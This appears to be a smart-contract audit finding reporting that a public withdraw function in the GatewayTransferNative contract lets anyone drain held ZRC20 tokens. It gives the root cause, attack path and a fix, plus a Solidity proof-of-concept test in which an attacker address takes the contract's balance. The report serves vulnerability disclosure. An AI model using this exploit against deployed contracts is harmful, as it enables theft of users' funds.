# Attacker can drain the ZRC20 tokens held in the GatewayTransferNative contract

### Summary

Attacker can drain ZRC20 tokens (i.e., representation asset of native asset in source chain or Zetachain) held within the `GatewayTransferNative` contract and claim them into native asset in the Bitcoin chain by calling the function `GatewayTransferNative::withdraw`, because of the function visibility specifier set to `public` instead of `internal` or `private`, potentially leading anyone to call the function.

### Root Cause

When the cross-chain transaction reverted or aborted, the funds either transfer to the user address or held within the contract with which the user amount being mapped in [`refundInfos`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L32). So that the user later can come to this function and call [`GatewayTransferNative::claimRefund`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L661-L680) function, the associated tokens of the user get transferred to user.

But because of the function [`GatewayTransferNative::withdraw`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L286-L304) being public, attacker can call this withdraw function and claim the remaining ZRC20 tokens held within the contract, which ultimately loses tokens for the users for their cross-chain transaction reversion.

Attacker can also claim those respective tokens by front-running the function [`GatewayTransferNative::superWithdraw`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L166-L174) to claim the funds within the contract. 

Ultimately leading losses to both user and protocol as they are being stole by some third party member.

### Internal Pre-conditions

- Assumes ZRC20 tokens held with in the `GatewayTransferNative` contract

### External Pre-conditions

N/A

### Attack Path

- Attacker calls the function `GatewayTransferNative::withdraw` by keeping his own address as receiver
- Attacker can claim the ZRC20 tokens held within the contract

### Impact

The impact is Critical-High, because of loss of ZRC20 to the attacker, both user and protocol will loss those tokens. The impact is critical for both the protocol and the user as user loses his assets that should be claimed later, and protocol loses it's credibility for not keeping the user assets secure upon cross-chain transaction reversion.

### PoC

Add this function into the test case of [`GatewayTransferNative`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/test/GatewayTransferNative.t.sol) contract

> **note that the below PoC says withdraw gas fee held within the contract, but in real scenario it isn't possible because the gas ZRC20 will be claimed by the PROTOCOL_ADDRESS of `GatewayZEVM` contract. So, I took a scenario, where tokens held within the contract such that I can show upon calling `GatewayTransferNative::withdraw` function, attacker can drain the funds within the contract**

```solidity
    function Bug_in_withdrawToNativeChain() public {
        uint256 amount = 100 ether;
        uint32 dstChainId = 8332; // chainId of Bitcoin in Zetachain
        address targetZRC20 = address(btcZ);
        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = btcAddress;
        bytes memory swapDataZ = "";
        bytes memory contractAddress = "";
        bytes memory fromTokenB = "";
        bytes memory toTokenB = "";
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        bytes memory message = encodeMessage(
            dstChainId,
            targetZRC20,
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(fromTokenB, toTokenB, swapDataB),
            accounts
        );

        // 1. mint enough tokens for user in the zetachain for cross-chain transaction
        btcZ.mint(user1, initialBalance);

        // 2. transfer the btcZ -> btc
        vm.startPrank(user1);
        btcZ.approve(address(gatewayTransferNative), amount);
        gatewayTransferNative.withdrawToNativeChain(
            address(btcZ),
            amount,
            message
        );
        vm.stopPrank();

        // 3. Attacker claims the held withdraw gasfee within the contract
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        gatewayTransferNative.withdraw(
            "random", // random bytes because it included in the revertOptions
            abi.encodePacked(attacker),
            address(btcZ),
            btcZ.balanceOf(address(gatewayTransferNative)) // stole all the funds held
        );

        assertEq(btcZ.balanceOf(attacker), 1 ether);
        assertEq(btcZ.balanceOf(user1), initialBalance - amount);
        assertEq(btc.balanceOf(user2), 99000000000000000000); // user2 is the address of user 1 in Bitcoin chain
    }
```

### Mitigation

Change the function visibility specifier of the function [`GatewayTransferNative::withdraw`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L286-L305) from public to internal or private.
